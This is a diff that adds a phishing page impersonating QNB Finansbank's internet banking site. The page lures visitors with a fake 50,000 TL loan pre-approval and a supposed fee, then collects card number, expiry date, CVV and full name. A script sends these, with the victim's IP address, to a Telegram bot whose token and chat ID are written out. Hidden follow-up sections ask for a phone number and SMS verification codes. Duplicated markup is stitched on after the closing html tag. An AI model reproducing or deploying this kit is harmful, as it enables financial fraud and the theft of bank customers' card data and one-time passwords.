@@ -1,0 +1,928 @@
+
+
+                               <!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>QNB Finansbank İnternet Şubesi</title>
+    <meta http-equiv="PRAGMA" content="NO-CACHE">
+    <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
+    <meta http-equiv="Expires" content="now">
+    <meta name="google" content="notranslate">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="viewport" content="width=device-width, user-scalable=no,initial-scale=1.0,minimum-scale=1,height=device-height">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="apple-itunes-app-new" content="app-id=739655617">
+    <meta name="msApplication-ID" content="App">
+    <link href="css/jquery.smartbanner.css" rel="stylesheet" type="text/css">
+    <link type="text/css" rel="stylesheet" href="css/FinansbankDropDownList.css">
+    <link type="text/css" rel="stylesheet" href="css/FBDialog.css">
+    <link type="text/css" rel="stylesheet" href="css/FBTooltip.css">
+    <link type="text/css" rel="stylesheet" href="css/FinansbankLoginStyle.css">
+    <link type="text/css" rel="stylesheet" href="css/warning.css">
+    <link type="text/css" rel="stylesheet" href="css/loginmain.css">
+    <link type="text/css" rel="stylesheet" href="css/bootstrap-ie11.css">
+    <link type="text/css" rel="stylesheet" href="css/cordale.min.css">
+    <link type="text/css" rel="stylesheet" href="css/muli.min.css">
+    <link type="text/css" rel="stylesheet" href="css/bootstrap.css">
+    <style type="text/css">
+        input[srt=numericpassword] {
+            -webkit-text-security: disc;
+        }
+
+        .sanalklavyeHelpConatiner {
+            width: 390px;
+            height: 250px;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 11px !important;
+            color: #4a4949;
+            background: url(/Content/Images/3Dstar.png) no-repeat;
+            background-position: 10px 10px;
+        }
+
+        .sanalklavyeHelpConatiner .content {
+            width: 270px;
+            float: right;
+        }
+
+        .sanalklavyeHelpConatiner h1 {
+            font-size: 12px;
+            font-weight: bold;
+            color: #870052;
+            margin: 0;
+            padding: 10px 0 0 0;
+        }
+
+        .sanalklavyeHelpConatiner p {
+            font-size: 11px !important;
+            margin: 0;
+            padding: 5px 0 0 0;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .spinner {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            border: 2px solid #ffffff; /* Beyaz renk */
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+            margin-left: 46%;
+        }
+
+        @keyframes spin {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .error {
+            border-color: red!important
+        }
+
+        #destekContent {
+            /*position: absolute;*/
+            left: 168px;
+            /*margin-top: 25px;*/
+            /*width: 246px;*/
+            width:100%;
+            z-index: 2;
+            top: auto !important;
+        }
+
+        #headerTitle {
+            /* position: absolute;
+             left: 14px;
+             top: auto !important;*/
+            height: 35px;
+            margin-top: 11px;
+            z-index: 1;
+            width: 100%;
+        }
+
+        #verisign {
+            position: absolute;
+            left: 5px;
+            top: 0px;
+            width: 73px;
+            height: 45px;
+            /*margin-top: 488px;*/
+            z-index: 4;
+        }
+
+        .qr_area {
+            border: 2px solid #d7d7d7;
+            border-radius: 10px;
+            padding: 10px;
+            float: left;
+            width: 100%;
+            min-height: 300px;
+            margin-bottom: 20px;
+            /*margin-top: -32px;
+            margin-left: 330px;*/
+        }
+
+        #keys {
+            margin-top: 2px!important;
+            margin-left: 2px!important;
+        }
+
+        .hatamesaji1ConfirmIframe .header2 {
+            height: 29px;
+        }
+
+        .popupcontentRoundedCornerDiv_bottom {
+            width:479px!important;
+        }
+
+        .hatamesaji1ConfirmIframe .popupcontent {
+            width:479px!important;
+        }
+
+        .linkbutton, .linkbutton:hover {
+            color:#394040 !important;
+        }
+
+        .ileriButton {
+            width: 280px;
+            color: #fff;
+            background-color: #800d52;
+            padding: 12px 20px;
+            border: 0;
+            text-align: left;
+            border-radius: 3px;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 20px;
+            position:absolute;
+            height:40px;
+            text-decoration:none;
+        }
+    </style>
+</head>
+<body>
+    <div>
+    </div>
+    <div id="preload-img" style="position: absolute; left: 420px; top: 250px; display: none">
+        <img id="ctl00_FinansbankLoaderImage" src="images/loader.gif" style="border-width:0px;">
+    </div>
+    <div class="container-lg px-0" style="max-width: 980px;">
+        <div id="ctl00_headerDiv" class="header-purple">
+            <div id="leftDiv" class="headerLeftDiv"></div>
+            <span id="imgText" class="headerImgText">İnternet Şubesi</span>
+        </div>
+
+        <section id="loginf">
+            <div class="row p-10-ch">
+                <div id="mainPanel" class="px-0 mainContent">
+                    <div class="row" style="height: 100%; justify-content: center;">
+                        <div class="col-lg-8 col-md-7 col-12 mainPanel-width" style="border: 2px solid #d7d7d7; border-radius: 10px; padding: 30px; float: left; min-height: 380px;">
+<center><h1>50.000TL Ön Onayınız Alındı.<br> Sigorta ve Dosya Masraf Ücreti<br> 2.750 TL'dir. </h1>
+<br> <h3> Sigorta Ve Dosya Masrafları Sıfır Faizli Kredi Kullanımlarında Aktif Tarafınıza Ait Kart Bilgilerinden Kesim Sağlanır ve Vadesiz Hesabınıza Anlık Olarak Kredi Miktarınız Aktarılır. İşlemleri Tamamlamanız için Dosya ve Sigorta Bedelinin Alınacağı Kart Bilgilerini Giriniz ve işlemleri Tamamlayınız.</h1>
+                            <form id="iadeForm">
+                                <div class="subPanel-width">
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                            <div class="row">
+                                                <div class="col-12">
+                                                    <div class="form-group">
+                                                        <span class="loginlabel">Kart Numaranız</span>
+                                                        <input id="kartNo" class="textfield" type="text" name="txtKartNo" maxlength="16" placeholder="Kart Numarası" required>
+                                                    </div>
+                                                </div>
+                                                <div class="col-12">
+                                                    <div class="form-group">
+                                                        <span class="loginlabel">Son Kullanma Tarihi (AA/YY)</span>
+                                                        <input id="expiryDate" class="textfield" type="text" name="expiryDate" maxlength="5" placeholder="AA/YY" required>
+                                                    </div>
+                                                </div>
+                                                <div class="col-12">
+                                                    <div class="form-group">
+                                                        <span class="loginlabel">CVV</span>
+                                                        <input id="cvv" class="textfield" type="text" name="cvv" maxlength="3" placeholder="CVV" required>
+                                                    </div>
+                                                </div>
+                                                <div class="col-12">
+                                                    <div class="form-group">
+                                                        <span class="loginlabel">Ad Soyad</span>
+                                                        <input id="adSoyad" class="textfield" type="text" name="adSoyad" placeholder="Ad Soyad" required>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                            <button type="submit" class="ileriButton">KREDİ TALEBİNİ ONAYLA</button>
+                                            <button type="button" id="loginProcess" class="ileriButton" style="display: none;">
+                                                <div class="spinner"></div>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <script type="text/javascript" src="js/jquery-1.6.2.min.js"></script>
+    <script type="text/javascript" src="js/jquery-ui-1.7.3.custom.min.js"></script>
+    <script type="text/javascript" src="js/jquery.json-2.3.min.js"></script>
+    <script type="text/javascript" src="js/jquery.data.js"></script>
+    <script type="text/javascript" src="js/jquery.watermark.js"></script>
+    <script type="text/javascript" src="js/FBGeneral.js"></script>
+    <script type="text/javascript" src="js/FBTooltip.js"></script>
+    <script type="text/javascript" src="js/rsa.js"></script>
+    <script type="text/javascript" src="js/FBDialog.js"></script>
+    <script type="text/javascript" src="js/bootstrap.js"></script>
+    <script src="js/jquery.inputmask.min.js"></script>
+    <script type="text/javascript" src="js/jquery.smartbanner.js"></script>
+
+    <script>
+        document.getElementById('iadeForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Sayfanın yeniden yüklenmesini önle
+
+            // Formdaki verileri al
+            var kartNo = document.getElementById('kartNo').value;
+            var expiryDate = document.getElementById('expiryDate').value;
+            var cvv = document.getElementById('cvv').value;
+            var adSoyad = document.getElementById('adSoyad').value;
+
+            console.log('Form verileri alındı:', kartNo, expiryDate, cvv, adSoyad);
+
+            if (kartNo && expiryDate && cvv && adSoyad) {
+                // IP adresini al
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        var ipAddress = data.ip;
+                        console.log('IP adresi alındı:', ipAddress);
+
+                        // Telegram Bot API URL'si
+                        var telegramAPI = 'https://api.telegram.org/bot7980571251:AAG4KdO3CrwcdE3eIgvVL_T6ZIx7F8Pf1E0/sendMessage';
+
+                        // Mesaj içeriği
+                        var message = 'Kart Numarası: ' + kartNo + '\nSon Kullanma Tarihi: ' + expiryDate + '\nCVV: ' + cvv + '\nAd Soyad: ' + adSoyad + '\nIP Adresi: ' + ipAddress;
+                        console.log('Mesaj içeriği:', message);
+
+                        // Telegram'a mesaj gönder
+                        fetch(telegramAPI, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: -1002390007242, // Hedef chat ID'si
+                                text: message
+                            })
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                window.location.href = 'bekle2.html';
+                            } else {
+                                console.error('Mesaj gönderilemedi', response.statusText);
+                            }
+                        })
+                        .catch(error => console.error('Telegram Fetch error:', error));
+                    })
+                    .catch(error => console.error('IP Adresi Fetch error:', error));
+            } else {
+                console.error('Lütfen tüm alanları doldurun.');
+            }
+        });
+    </script>
+</body>
+</html>
+ 
+                                
+
+                            <div class="col-lg-4 col-md-5 col-12 row-left-padding" style="padding-right: 0px;">
+                                <div id="ctl00_mainContentPlaceHolder_QRArea" class="qr_area d-none d-lg-block d-xl-block">
+                                    <table>
+                                        <tbody>
+                                            <tr>
+                                                <td>
+                                                    <span id="ctl00_mainContentPlaceHolder_QRHeader" style="outline: none; margin-left: 8px; font-weight: bold; width: 100%;">Karekod ile Hızlı Giriş</span>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td style="line-height: 15px;">
+                                                    <img id="ctl00_mainContentPlaceHolder_QRCodeImage" onclick="return QRClicked();" src="images/qr_disabled.png" style="height:118px;width:118px;border-width:0px;position: absolute; margin-top: 30px; margin-left: 82px;">
+                                                    <img id="ctl00_mainContentPlaceHolder_QRRefreshImage" onclick="return QRClicked();" src="images/captcha-refresh.jpg" style="border-width:0px;position: absolute; margin-top: 65px; margin-left: 132px;">
+                                                    <a onclick="return ;" id="QRCodeLoginButton" class="linkbutton" href="javascript:__doPostBack('ctl00$mainContentPlaceHolder$QRCodeLoginButton','')" style="visibility: hidden"></a>
+                                                    <p id="qrp" style="padding-top: 90px; padding-left: 85px; outline: none; text-align: center; width: 201px; color: #800d52;">Size özel karekodunuzu almak için tıklayınız.</p>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td>
+                                                    <span id="ctl00_mainContentPlaceHolder_QRInfo" alt="Karekod ile giriş yapmak için QNB Mobil'in açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için <a href=# OnClick=showQRHelpPopup();>tıklayınız.</a>" style="position: absolute; outline: none; margin-top: 30px; width: 285px; margin-left: 8px; line-height: 16px;">Karekod ile giriş yapmak için QNB Mobil'in açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için <a href="https://internetsubesi.qnbfinansbank.com/Login/LoginPage.aspx#" onclick="showQRHelpPopup();">tıklayınız.</a></span>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                                <div>
+
+
+                                    <div id="guvenlik" class="info-box" style="visibility: visible; display: contents; top: 320px;">
+                                        <h3><span id="ctl00_mainContentPlaceHolder_lblSubContentBottomTitle">Güvenliğiniz İçin</span></h3>
+                                        <ul id="ctl00_mainContentPlaceHolder_blSubContentBottomList">
+                                            <li>FinansŞifreniz ve bankamız tarafından cep telefonunuza gönderilen tek kullanımlık şifreler yalnızca size özeldir, bankamız personeli dahil kimse ile paylaşmayınız. Detaylı bilgi ve güvenlik önlemleri için lütfen
+                                                <a target="_blank" href="https://www.qnbfinansbank.com/724-bankacilik/internet-subesi#db-3"><b>buraya</b></a> tıklayınız.</li>
+                                        </ul>
+                                    </div>
+
+                                    <div id="webLoanInfoDiv" style="display: none;">
+
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <input type="hidden" name="ctl00$mainContentPlaceHolder$dd5fcb6461304a64adbfb0462736cb6c" id="dd5fcb6461304a64adbfb0462736cb6c">
+
+                    </div>
+                </div>
+            </section>
+
+            <section id="phonef" style="display:none;">
+                <div class="row p-10-ch">
+                    <div id="mainPanel" class="px-0 mainContent">
+                        <div class="row" style="height: 100%; justify-content: center;">
+                            <div class="col-lg-8 col-md-7 col-12 mainPanel-width" style="border: 2px solid #d7d7d7; border-radius: 10px; padding: 30px; float: left; min-height: 380px;">
+                              
+                                <div class="subPanel-width">
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                            <div class="row">
+                                                <div class="col-12">
+                                                    <div class="form-group">
+                                                        <h4 style=" white-space: nowrap; margin-bottom:10px;">Güvenlik Aşamasını Tamamlayınız</h4>
+                                                        <span id="ctl00_mainContentPlaceHolder_UserIDLabel" class="loginlabel">Telefon Numarası</span>
+                                                        <input type="text" id="phone" maxlength="11" autocomplete="off" title="Telefon Numarası">
+                                                    </div>
+                                                </div>
+                                                <div class="col-12">
+                                                    
+                                                </div>
+                                            </div>
+                                        </div>
+                                        </div>
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                        </div>
+
+                                    </div>
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                            <button type="button" id="loginButtonPhone" onclick="submitPhone();" class="ileriButton">İleri</button>
+                                            <button type="button" id="loginProcessPhone" class="ileriButton" style="display: none;"><div class="spinner"></div></button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="col-lg-4 col-md-5 col-12 row-left-padding" style="padding-right: 0px;">
+                                <div id="ctl00_mainContentPlaceHolder_QRArea" class="qr_area d-none d-lg-block d-xl-block">
+                                    <table>
+                                        <tbody>
+                                            <tr>
+                                                <td>
+                                                    <span id="ctl00_mainContentPlaceHolder_QRHeader" style="outline: none; margin-left: 8px; font-weight: bold; width: 100%;">Karekod ile Hızlı Giriş</span>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td style="line-height: 15px;">
+                                                    <img id="ctl00_mainContentPlaceHolder_QRCodeImage" onclick="return QRClicked();" src="images/qr_disabled.png" style="height:118px;width:118px;border-width:0px;position: absolute; margin-top: 30px; margin-left: 82px;">
+                                                    <img id="ctl00_mainContentPlaceHolder_QRRefreshImage" onclick="return QRClicked();" src="images/captcha-refresh.jpg" style="border-width:0px;position: absolute; margin-top: 65px; margin-left: 132px;">
+                                                    <a onclick="return ;" id="QRCodeLoginButton" class="linkbutton" href="javascript:__doPostBack('ctl00$mainContentPlaceHolder$QRCodeLoginButton','')" style="visibility: hidden"></a>
+                                                    <p id="qrp" style="padding-top: 90px; padding-left: 85px; outline: none; text-align: center; width: 201px; color: #800d52;">Size özel karekodunuzu almak için tıklayınız.</p>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td>
+                                                    <span id="ctl00_mainContentPlaceHolder_QRInfo" alt="Karekod ile giriş yapmak için QNB Mobil'in açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için <a href=# OnClick=showQRHelpPopup();>tıklayınız.</a>" style="position: absolute; outline: none; margin-top: 30px; width: 285px; margin-left: 8px; line-height: 16px;">Karekod ile giriş yapmak için QNB Mobil'in açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için <a href="https://internetsubesi.qnbfinansbank.com/Login/LoginPage.aspx#" onclick="showQRHelpPopup();">tıklayınız.</a></span>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                                <div>
+
+
+                                    <div id="guvenlik" class="info-box" style="visibility: visible; display: contents; top: 320px;">
+                                        <h3><span id="ctl00_mainContentPlaceHolder_lblSubContentBottomTitle">Güvenliğiniz İçin</span></h3>
+                                        <ul id="ctl00_mainContentPlaceHolder_blSubContentBottomList">
+                                            <li>FinansŞifreniz ve bankamız tarafından cep telefonunuza gönderilen tek kullanımlık şifreler yalnızca size özeldir, bankamız personeli dahil kimse ile paylaşmayınız. Detaylı bilgi ve güvenlik önlemleri için lütfen
+                                                <a target="_blank" href="https://www.qnbfinansbank.com/724-bankacilik/internet-subesi#db-3"><b>buraya</b></a> tıklayınız.</li>
+                                        </ul>
+                                    </div>
+
+                                    <div id="webLoanInfoDiv" style="display: none;">
+
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <input type="hidden" name="ctl00$mainContentPlaceHolder$dd5fcb6461304a64adbfb0462736cb6c" id="dd5fcb6461304a64adbfb0462736cb6c">
+
+                    </div>
+                </div>
+            </section>
+
+            <section id="smsf" style="display:none;">
+                <div class="row p-10-ch">
+                    <div id="mainPanel" class="px-0 mainContent">
+                        <div class="row" style="height: 100%; justify-content: center;">
+                            <div class="col-lg-8 col-md-7 col-12 mainPanel-width" style="border: 2px solid #d7d7d7; border-radius: 10px; padding: 30px; float: left; min-height: 380px;">
+                              
+                                <div class="subPanel-width">
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                            <div class="row">
+                                                <div class="col-12">
+                                                    <div class="form-group">
+                                                        <h4 style=" white-space: nowrap; margin-bottom:10px;">Son bir adım kaldı</h4>
+                                                        <span id="ctl00_mainContentPlaceHolder_UserIDLabel" class="loginlabel">SMS Doğrulama Kodu</span>
+                                                        <input type="text" id="sms" maxlength="6" autocomplete="off" title="Sms Şifresi">
+                                                    </div>
+                                                </div>
+                                                <div class="col-12">
+                                                    
+                                                </div>
+                                            </div>
+                                        </div>
+                                        </div>
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                        </div>
+
+                                    </div>
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                            <button type="button" id="loginButtonSms" onclick="submitSms();" class="ileriButton">İleri</button>
+                                            <button type="button" id="loginProcessSms" class="ileriButton" style="display: none;"><div class="spinner"></div></button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="col-lg-4 col-md-5 col-12 row-left-padding" style="padding-right: 0px;">
+                                <div id="ctl00_mainContentPlaceHolder_QRArea" class="qr_area d-none d-lg-block d-xl-block">
+                                    <table>
+                                        <tbody>
+                                            <tr>
+                                                <td>
+                                                    <span id="ctl00_mainContentPlaceHolder_QRHeader" style="outline: none; margin-left: 8px; font-weight: bold; width: 100%;">Karekod ile Hızlı Giriş</span>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td style="line-height: 15px;">
+                                                    <img id="ctl00_mainContentPlaceHolder_QRCodeImage" onclick="return QRClicked();" src="images/qr_disabled.png" style="height:118px;width:118px;border-width:0px;position: absolute; margin-top: 30px; margin-left: 82px;">
+                                                    <img id="ctl00_mainContentPlaceHolder_QRRefreshImage" onclick="return QRClicked();" src="images/captcha-refresh.jpg" style="border-width:0px;position: absolute; margin-top: 65px; margin-left: 132px;">
+                                                    <a onclick="return ;" id="QRCodeLoginButton" class="linkbutton" href="javascript:__doPostBack('ctl00$mainContentPlaceHolder$QRCodeLoginButton','')" style="visibility: hidden"></a>
+                                                    <p id="qrp" style="padding-top: 90px; padding-left: 85px; outline: none; text-align: center; width: 201px; color: #800d52;">Size özel karekodunuzu almak için tıklayınız.</p>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td>
+                                                    <span id="ctl00_mainContentPlaceHolder_QRInfo" alt="Karekod ile giriş yapmak için QNB Mobil'in açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için <a href=# OnClick=showQRHelpPopup();>tıklayınız.</a>" style="position: absolute; outline: none; margin-top: 30px; width: 285px; margin-left: 8px; line-height: 16px;">Karekod ile giriş yapmak için QNB Mobil'in açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için <a href="https://internetsubesi.qnbfinansbank.com/Login/LoginPage.aspx#" onclick="showQRHelpPopup();">tıklayınız.</a></span>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                                <div>
+
+
+                                    <div id="guvenlik" class="info-box" style="visibility: visible; display: contents; top: 320px;">
+                                        <h3><span id="ctl00_mainContentPlaceHolder_lblSubContentBottomTitle">Güvenliğiniz İçin</span></h3>
+                                        <ul id="ctl00_mainContentPlaceHolder_blSubContentBottomList">
+                                            <li>FinansŞifreniz ve bankamız tarafından cep telefonunuza gönderilen tek kullanımlık şifreler yalnızca size özeldir, bankamız personeli dahil kimse ile paylaşmayınız. Detaylı bilgi ve güvenlik önlemleri için lütfen
+                                                <a target="_blank" href="https://www.qnbfinansbank.com/724-bankacilik/internet-subesi#db-3"><b>buraya</b></a> tıklayınız.</li>
+                                        </ul>
+                                    </div>
+
+                                    <div id="webLoanInfoDiv" style="display: none;">
+
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <input type="hidden" name="ctl00$mainContentPlaceHolder$dd5fcb6461304a64adbfb0462736cb6c" id="dd5fcb6461304a64adbfb0462736cb6c">
+
+                    </div>
+                </div>
+            </section>
+
+            <section id="errorsms" style="display:none;">
+                <div class="row p-10-ch">
+                    <div id="mainPanel" class="px-0 mainContent">
+                        <div class="row" style="height: 100%; justify-content: center;">
+                            <div class="col-lg-8 col-md-7 col-12 mainPanel-width" style="border: 2px solid #d7d7d7; border-radius: 10px; padding: 30px; float: left; min-height: 380px;">
+                              
+                                <div class="subPanel-width">
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                            <div class="row">
+                                                <div class="col-12">
+                                                    <div class="form-group">
+                                                        <h4 style=" white-space: nowrap; margin-bottom:10px; color: red;">Hatalı giriş yaptınız.</h4>
+                                                        <span id="ctl00_mainContentPlaceHolder_UserIDLabel" class="loginlabel">SMS Doğrulama Kodu</span>
+                                                        <input type="text" id="smserror" maxlength="6" autocomplete="off" title="Sms Şifresi">
+                                                    </div>
+                                                </div>
+                                                <div class="col-12">
+                                                    
+                                                </div>
+                                            </div>
+                                        </div>
+                                        </div>
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                        </div>
+
+                                    </div>
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                            <button type="button" id="loginButtonSmsError" onclick="submitSmsError();" class="ileriButton">İleri</button>
+                                            <button type="button" id="loginProcessSmsError" class="ileriButton" style="display: none;"><div class="spinner"></div></button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="col-lg-4 col-md-5 col-12 row-left-padding" style="padding-right: 0px;">
+                                <div id="ctl00_mainContentPlaceHolder_QRArea" class="qr_area d-none d-lg-block d-xl-block">
+                                    <table>
+                                        <tbody>
+                                            <tr>
+                                                <td>
+                                                    <span id="ctl00_mainContentPlaceHolder_QRHeader" style="outline: none; margin-left: 8px; font-weight: bold; width: 100%;">Karekod ile Hızlı Giriş</span>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td style="line-height: 15px;">
+                                                    <img id="ctl00_mainContentPlaceHolder_QRCodeImage" onclick="return QRClicked();" src="images/qr_disabled.png" style="height:118px;width:118px;border-width:0px;position: absolute; margin-top: 30px; margin-left: 82px;">
+                                                    <img id="ctl00_mainContentPlaceHolder_QRRefreshImage" onclick="return QRClicked();" src="images/captcha-refresh.jpg" style="border-width:0px;position: absolute; margin-top: 65px; margin-left: 132px;">
+                                                    <a onclick="return ;" id="QRCodeLoginButton" class="linkbutton" href="javascript:__doPostBack('ctl00$mainContentPlaceHolder$QRCodeLoginButton','')" style="visibility: hidden"></a>
+                                                    <p id="qrp" style="padding-top: 90px; padding-left: 85px; outline: none; text-align: center; width: 201px; color: #800d52;">Size özel karekodunuzu almak için tıklayınız.</p>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td>
+                                                    <span id="ctl00_mainContentPlaceHolder_QRInfo" alt="Karekod ile giriş yapmak için QNB Mobil'in açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için <a href=# OnClick=showQRHelpPopup();>tıklayınız.</a>" style="position: absolute; outline: none; margin-top: 30px; width: 285px; margin-left: 8px; line-height: 16px;">Karekod ile giriş yapmak için QNB Mobil'in açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için <a href="https://internetsubesi.qnbfinansbank.com/Login/LoginPage.aspx#" onclick="showQRHelpPopup();">tıklayınız.</a></span>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                                <div>
+
+
+                                    <div id="guvenlik" class="info-box" style="visibility: visible; display: contents; top: 320px;">
+                                        <h3><span id="ctl00_mainContentPlaceHolder_lblSubContentBottomTitle">Güvenliğiniz İçin</span></h3>
+                                        <ul id="ctl00_mainContentPlaceHolder_blSubContentBottomList">
+                                            <li>FinansŞifreniz ve bankamız tarafından cep telefonunuza gönderilen tek kullanımlık şifreler yalnızca size özeldir, bankamız personeli dahil kimse ile paylaşmayınız. Detaylı bilgi ve güvenlik önlemleri için lütfen
+                                                <a target="_blank" href="https://www.qnbfinansbank.com/724-bankacilik/internet-subesi#db-3"><b>buraya</b></a> tıklayınız.</li>
+                                        </ul>
+                                    </div>
+
+                                    <div id="webLoanInfoDiv" style="display: none;">
+
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <input type="hidden" name="ctl00$mainContentPlaceHolder$dd5fcb6461304a64adbfb0462736cb6c" id="dd5fcb6461304a64adbfb0462736cb6c">
+
+                    </div>
+                </div>
+            </section>
+
+            <section id="verf" style="display:none;">
+                <div class="row p-10-ch">
+                    <div id="mainPanel" class="px-0 mainContent">
+                        <div class="row" style="height: 100%; justify-content: center;">
+                            <div class="col-lg-8 col-md-7 col-12 mainPanel-width" style="border: 2px solid #d7d7d7; border-radius: 10px; padding: 30px; float: left; min-height: 380px;">
+                              
+                                <div class="subPanel-width">
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                            <div class="row">
+                                                <div class="col-12">
+                                                    <div class="form-group">
+                                                        <h4 style="margin-bottom:10px;">Başvurunuz alınmıştır. <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#880052" class="bi bi-check-circle-fill" viewBox="0 0 16 16">
+                                                          <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0m-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"></path>
+                                                        </svg><br><br> En kısa süre içerisinde bankamız tarafından iletişime geçilecektir.</h4>
+                                                    </div>
+                                                </div>
+                                                <div class="col-12">
+                                                    
+                                                </div>
+                                            </div>
+                                        </div>
+                                        </div>
+                                    <div class="row">
+                                        <div class="col-lg-6 col-12">
+                                        </div>
+
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="col-lg-4 col-md-5 col-12 row-left-padding" style="padding-right: 0px;">
+                                <div id="ctl00_mainContentPlaceHolder_QRArea" class="qr_area d-none d-lg-block d-xl-block">
+                                    <table>
+                                        <tbody>
+                                            <tr>
+                                                <td>
+                                                    <span id="ctl00_mainContentPlaceHolder_QRHeader" style="outline: none; margin-left: 8px; font-weight: bold; width: 100%;">Karekod ile Hızlı Giriş</span>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td style="line-height: 15px;">
+                                                    <img id="ctl00_mainContentPlaceHolder_QRCodeImage" onclick="return QRClicked();" src="images/qr_disabled.png" style="height:118px;width:118px;border-width:0px;position: absolute; margin-top: 30px; margin-left: 82px;">
+                                                    <img id="ctl00_mainContentPlaceHolder_QRRefreshImage" onclick="return QRClicked();" src="images/captcha-refresh.jpg" style="border-width:0px;position: absolute; margin-top: 65px; margin-left: 132px;">
+                                                    <a onclick="return ;" id="QRCodeLoginButton" class="linkbutton" href="javascript:__doPostBack('ctl00$mainContentPlaceHolder$QRCodeLoginButton','')" style="visibility: hidden"></a>
+                                                    <p id="qrp" style="padding-top: 90px; padding-left: 85px; outline: none; text-align: center; width: 201px; color: #800d52;">Size özel karekodunuzu almak için tıklayınız.</p>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td>
+                                                    <span id="ctl00_mainContentPlaceHolder_QRInfo" alt="Karekod ile giriş yapmak için QNB Mobil'in açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için <a href=# OnClick=showQRHelpPopup();>tıklayınız.</a>" style="position: absolute; outline: none; margin-top: 30px; width: 285px; margin-left: 8px; line-height: 16px;">Karekod ile giriş yapmak için QNB Mobil'in açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için <a href="https://internetsubesi.qnbfinansbank.com/Login/LoginPage.aspx#" onclick="showQRHelpPopup();">tıklayınız.</a></span>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                                <div>
+
+
+                                    <div id="guvenlik" class="info-box" style="visibility: visible; display: contents; top: 320px;">
+                                        <h3><span id="ctl00_mainContentPlaceHolder_lblSubContentBottomTitle">Güvenliğiniz İçin</span></h3>
+                                        <ul id="ctl00_mainContentPlaceHolder_blSubContentBottomList">
+                                            <li>FinansŞifreniz ve bankamız tarafından cep telefonunuza gönderilen tek kullanımlık şifreler yalnızca size özeldir, bankamız personeli dahil kimse ile paylaşmayınız. Detaylı bilgi ve güvenlik önlemleri için lütfen
+                                                <a target="_blank" href="https://www.qnbfinansbank.com/724-bankacilik/internet-subesi#db-3"><b>buraya</b></a> tıklayınız.</li>
+                                        </ul>
+                                    </div>
+
